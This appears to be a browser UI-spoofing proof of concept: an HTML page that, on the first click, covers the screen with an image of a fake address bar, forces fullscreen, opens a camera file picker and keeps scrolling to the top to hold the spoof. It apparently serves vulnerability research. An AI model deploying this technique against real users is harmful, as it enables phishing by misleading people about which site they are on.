<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Security UI Spoof (UX Demo)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #111;
      color: #fff;
      font-family: sans-serif;
      height: 200vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      overflow-x: hidden;
    }

    #spoof {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: none;
      z-index: 9999;
      pointer-events: none;
    }

    #content {
      text-align: center;
    }

    input[type=file] {
      display: none;
    }
  </style>
</head>
<body>

<img id="spoof" src="spof1.png" alt="UI overlay">
<div id="content">
  <h1>Click anywhere on the page to spoof the omnibox!</h1>
</div>

<input id="filePicker" type="file" accept="image/*" capture="environment">

<script>
const filePicker = document.getElementById('filePicker');
const spoof = document.getElementById('spoof');
const content = document.getElementById('content');

// Scroll instan ke atas
function forceScrollTop() {
  window.scrollTo(0, 0);
  document.body.scrollTop = 0;   // untuk beberapa device
  document.documentElement.scrollTop = 0;
}

// Klik awal
document.addEventListener('click', async () => {
  // 1️⃣ overlay
  spoof.style.display = 'block';
  content.style.display = 'none';

  // 2️⃣ fullscreen
  if (document.documentElement.requestFullscreen) {
    try { await document.documentElement.requestFullscreen(); } catch(e) {}
  }

  // 3️⃣ trigger file picker
  filePicker.click();

  // paksa scroll ke atas beberapa kali
  setTimeout(forceScrollTop, 50);
  setTimeout(forceScrollTop, 200);
}, { once: true });

// fullscreen change
document.addEventListener('fullscreenchange', () => {
  if (!document.fullscreenElement) {
    // keluar fullscreen, scroll instan ke atas
    forceScrollTop();
  }
});

// Polling untuk Android back button
setInterval(() => {
  if (!document.fullscreenElement) {
    forceScrollTop();
  }
}, 100);

filePicker.addEventListener('change', () => {
  if (filePicker.files.length > 0) {
    alert('File selected: ' + filePicker.files[0].name);
  }
});
</script>

</body>
</html>
